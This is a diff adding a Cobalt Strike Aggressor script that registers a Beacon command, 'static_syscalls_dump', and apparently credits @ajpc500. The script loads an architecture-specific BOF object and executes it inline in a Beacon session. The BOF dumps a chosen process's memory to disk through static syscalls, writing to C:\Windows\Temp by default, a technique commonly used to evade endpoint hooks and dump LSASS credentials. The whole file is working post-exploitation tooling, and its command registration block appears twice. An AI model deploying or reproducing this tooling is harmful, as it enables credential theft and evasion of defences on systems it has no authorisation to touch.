@@ -1,0 +1,38 @@
+beacon_command_register(
+"static_syscalls_dump", 
+"Use static syscalls to dump a given PID and save to disk", 
+"Synopsis: static_syscalls_dump PID output_file");
+
+beacon_command_register(
+"static_syscalls_dump", 
+"Use static syscalls to dump a given PID and save to disk", 
+"Synopsis: static_syscalls_dump PID output_file");
+
+alias static_syscalls_dump {
+	local('$handle $data $args $pid $output_file');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsdump. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	if(size(@_) < 2)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("static_syscalls_dump"));
+		return;
+	}
+
+	$output_file = iff(-istrue $3, $3, "C:\\Windows\\Temp\\PID- $+ $2 $+ .dmp");
+
+	# pack our arguments
+	$args = bof_pack($1, "iz", $2, $output_file);
+	
+	btask($1, "Syscalls Process Dump BOF (@ajpc500)");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
